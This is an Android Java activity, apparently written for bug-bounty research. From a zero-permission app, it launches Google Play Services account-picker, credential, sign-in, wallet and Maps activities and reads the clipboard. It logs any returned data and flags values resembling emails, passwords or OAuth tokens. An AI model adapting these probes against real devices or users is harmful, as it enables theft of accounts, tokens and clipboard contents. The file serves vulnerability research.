package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class AccountPickerProbeActivity extends Activity {
    private static final String T = "ACCTPROBE";
    private int probeIndex = 0;

    private static final Object[][] PROBES = {
        // GMS Account Picker — returns selected account?
        {100, "AccountPicker_UserTile",
         "com.google.android.gms", "com.google.android.gms.common.account.AccountPickerActivity",
         "com.google.android.gms.common.account.CHOOSE_ACCOUNT_USERTILE", null},

        // GMS Simple Dialog Account Picker
        {101, "AccountPicker_Simple",
         "com.google.android.gms", "com.google.android.gms.common.account.SimpleDialogAccountPickerActivity",
         "com.google.android.gms.common.account.CHOOSE_ACCOUNT", null},

        // GMS Credential Export — does it export credentials to caller?
        {102, "CredentialExport",
         "com.google.android.gms", "com.google.android.gms.credential.manager.credentialexchange.ExportCredentialsActivity",
         "androidx.identitycredentials.action.IMPORT_CREDENTIALS", null},

        // GMS SignInCredentialChooser
        {103, "SignInCredChooser",
         "com.google.android.gms", "com.google.android.gms.identitycredentials.ui.SignInCredentialChooserActivity",
         "android.service.credentials.action.CREATE_CREDENTIAL", null},

        // GMS PhoneNumberHint (known working — baseline)
        {104, "PhoneNumberHint",
         "com.google.android.gms", "com.google.android.gms.auth.api.credentials.assistedsignin.ui.PhoneNumberHintActivity",
         "com.google.android.gms.auth.api.phone.PHONE_NUMBER_HINT", null},

        // GMS GoogleSignIn
        {105, "GoogleSignIn",
         "com.google.android.gms", "com.google.android.gms.auth.api.credentials.assistedsignin.ui.GoogleSignInActivity",
         "com.google.android.gms.auth.GOOGLE_SIGN_IN", null},

        // GMS AssistedSignIn
        {106, "AssistedSignIn",
         "com.google.android.gms", "com.google.android.gms.auth.api.credentials.assistedsignin.ui.AssistedSignInActivity",
         "com.google.android.gms.auth.api.credentials.ASSISTED_SIGNIN", null},

        // Nearby Share receive
        {107, "NearbyReceive",
         "com.google.android.gms", "com.google.android.gms.nearby.sharing.main.MainActivity",
         "com.google.android.gms.RECEIVE_NEARBY", null},

        // GMS DckActivity — digital car key
        {108, "DckSelectAccount",
         "com.google.android.gms", "com.google.android.gms.dck.main.DckActivity",
         "com.google.android.gms.dck.SELECT_ACCOUNT", null},

        // GMS FastPair activities
        {109, "FastPairHalfSheet",
         "com.google.android.gms", "com.google.android.gms.nearby.fastpair.halfsheet.HalfSheetActivity",
         "android.intent.action.VIEW", "nearby://fastpair"},

        // Pay deep link activities with content URIs
        {110, "PayProcessResource",
         "com.google.android.gms", "com.google.android.gms.pay.deeplink.AliasProcessWalletableResourceActivity",
         "android.intent.action.VIEW", null},

        // GMS GestureExchange
        {111, "GestureExchange",
         "com.google.android.gms", "com.google.android.gms.gestureexchange.ui.taptoshare.IntentFulfillmentActivity",
         "android.intent.action.VIEW", null},

        // Google Maps with geo URI — check if it returns location data
        {112, "Maps_GeoUri",
         "com.google.android.apps.maps", "com.google.android.maps.MapsActivity",
         "android.intent.action.VIEW", "geo:0,0?q=my+location"},
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Account Picker & Credential Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());

        probeClipboard();
        launchNextProbe();
    }

    private void probeClipboard() {
        Log.w(T, "--- Clipboard Probe ---");
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null) {
                    Log.w(T, "[!!!] CLIPBOARD HAS DATA: items=" + clip.getItemCount());
                    ClipData.Item item = clip.getItemAt(0);
                    if (item.getText() != null) {
                        String text = item.getText().toString();
                        Log.w(T, "[!!!] CLIPBOARD TEXT: " + text.substring(0, Math.min(text.length(), 200)));
                    }
                    if (item.getUri() != null) {
                        Log.w(T, "[!!!] CLIPBOARD URI: " + item.getUri());
                    }
                }
            } else {
                Log.w(T, "Clipboard empty");
            }
        } catch (Exception e) {
            Log.w(T, "Clipboard: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void launchNextProbe() {
        if (probeIndex >= PROBES.length) {
            Log.w(T, "=== ALL PROBES COMPLETE ===");
            return;
        }

        int reqCode = (Integer) PROBES[probeIndex][0];
        String label = (String) PROBES[probeIndex][1];
        String pkg = (String) PROBES[probeIndex][2];
        String cls = (String) PROBES[probeIndex][3];
        String action = (String) PROBES[probeIndex][4];
        String dataUri = (String) PROBES[probeIndex][5];
        probeIndex++;

        Log.w(T, "--- [" + probeIndex + "/" + PROBES.length + "] " + label + " ---");

        try {
            Intent intent = new Intent(action);
            intent.setComponent(new ComponentName(pkg, cls));
            if (dataUri != null) {
                intent.setData(Uri.parse(dataUri));
            }
            intent.addCategory("android.intent.category.DEFAULT");

            // Add extras that account pickers might respond to
            intent.putExtra("allowableAccountTypes", new String[]{"com.google"});
            intent.putExtra("accountTypes", new String[]{"com.google"});
            intent.putExtra("alwaysPromptForAccount", true);
            intent.putExtra("return_data", true);

            startActivityForResult(intent, reqCode);
            Log.w(T, "  Launched: " + label);

            getWindow().getDecorView().postDelayed(() -> {
                Log.w(T, "  Timeout: " + label);
                launchNextProbe();
            }, 4000);

        } catch (SecurityException se) {
            Log.w(T, "  SECURITY: " + label + " — " + se.getMessage());
            launchNextProbe();
        } catch (Exception e) {
            Log.w(T, "  ERROR: " + label + " — " + e.getClass().getSimpleName() + ": " +
                    (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 120)) : "null"));
            launchNextProbe();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String label = "req=" + requestCode;
        for (Object[] probe : PROBES) {
            if ((Integer) probe[0] == requestCode) {
                label = (String) probe[1];
                break;
            }
        }

        Log.w(T, "[RESULT] " + label + " resultCode=" + resultCode);

        if (resultCode == RESULT_OK) {
            Log.w(T, "[!!!] RESULT_OK from " + label);
        }

        if (data != null) {
            Log.w(T, "[!!!] DATA RETURNED from " + label);
            if (data.getData() != null) {
                Log.w(T, "  [!!!] URI: " + data.getData());
            }
            if (data.getAction() != null) {
                Log.w(T, "  [!!!] ACTION: " + data.getAction());
            }
            if (data.getType() != null) {
                Log.w(T, "  [!!!] TYPE: " + data.getType());
            }
            if (data.getExtras() != null) {
                Bundle extras = data.getExtras();
                Log.w(T, "  [!!!] EXTRAS: " + extras.keySet());
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val != null) {
                        String valStr = val.toString();
                        Log.w(T, "  [!!!] " + key + " (" + val.getClass().getSimpleName() + ") = " +
                                valStr.substring(0, Math.min(valStr.length(), 300)));

                        if (valStr.contains("@") || valStr.contains("gmail") ||
                            valStr.contains("token") || valStr.contains("ya29.") ||
                            valStr.contains("password") || valStr.contains("credential") ||
                            valStr.contains("account") || valStr.contains("phone") ||
                            valStr.contains("+1")) {
                            Log.w(T, "  [!!!][!!!] SENSITIVE DATA IN RESULT: " + key + " = " + valStr);
                        }
                    }
                }
            }
            if (data.getClipData() != null) {
                Log.w(T, "  [!!!] CLIP DATA: " + data.getClipData());
            }
        } else {
            Log.w(T, "  No data in result for " + label);
        }

        // Continue to next probe
        launchNextProbe();
    }
}
